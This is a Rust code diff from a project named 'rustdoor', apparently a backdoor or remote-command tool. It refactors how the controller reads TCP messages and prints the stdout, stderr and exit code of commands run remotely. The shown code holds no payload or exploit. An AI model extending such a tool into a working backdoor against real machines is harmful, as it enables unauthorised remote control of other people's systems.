@@ -4,14 +4,17 @@ use std::str::from_utf8;
 
 use byteorder::{BigEndian, WriteBytesExt};
 use rustdoor::communication::messages::{
-    MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
+    Message, MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_HEADER_LENGTH,
 };
-use rustdoor::communication::serialization::get_msg_type_and_length;
+use rustdoor::communication::server::get_message;
+use std::sync::mpsc::TryRecvError;
+use std::sync::mpsc::TryRecvError::Disconnected;
 
-fn handle_response(message: &[u8], msg_type: u8) {
+fn handle_response(message: Message) {
     println!("Response got: {:?}", message);
-    if msg_type == MessageType::RunCommandType as u8 {
-        let response: RunCommandResponse = ron::de::from_bytes(message).unwrap();
+    if message.message_type == MessageType::RunCommandType as u8 {
+        let response: RunCommandResponse =
+            ron::de::from_bytes(&message.serialized_message).unwrap();
         println!("Stdout: {:?} ", from_utf8(&response.stdout).unwrap());
         println!("Stderr: {:?} ", from_utf8(&response.stderr).unwrap());
         println!("Error code: {:?}", response.error_code);
@@ -19,31 +22,17 @@ fn handle_response(message: &[u8], msg_type: u8) {
 }
 
 pub fn get_response(stream: &mut TcpStream) -> Result<(), Error> {
-    let mut type_and_length = [0 as u8; MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE];
-    while match stream.read(&mut type_and_length) {
-        Ok(size) => match size {
-            0 => false,
-            _ => {
-                let (msg_type, msg_length) = get_msg_type_and_length(type_and_length);
-                let mut message = vec![0; msg_length];
-
-                // Read_exact function guarantees that we will read exactly enough data to fill the buffer
-                stream
-                    .read_exact(&mut message)
-                    .expect("Could not read message after getting message metadata. Error: {}");
-                handle_response(&message, msg_type);
-                true
-            }
-        },
+    match get_message(&stream) {
+        Ok(message) => {
+            handle_response(message);
+        }
         Err(e) => {
             println!(
-                "An error occurred while getting response, terminating connection with {}. Error: {}",
-                stream.peer_addr()?,
+                "An error occurred while trying to get message. Error: {}",
                 e
             );
-            stream.shutdown(Shutdown::Both)?;
-            false
+            return Err(e);
         }
-    } {}
+    }
     Ok(())
 }
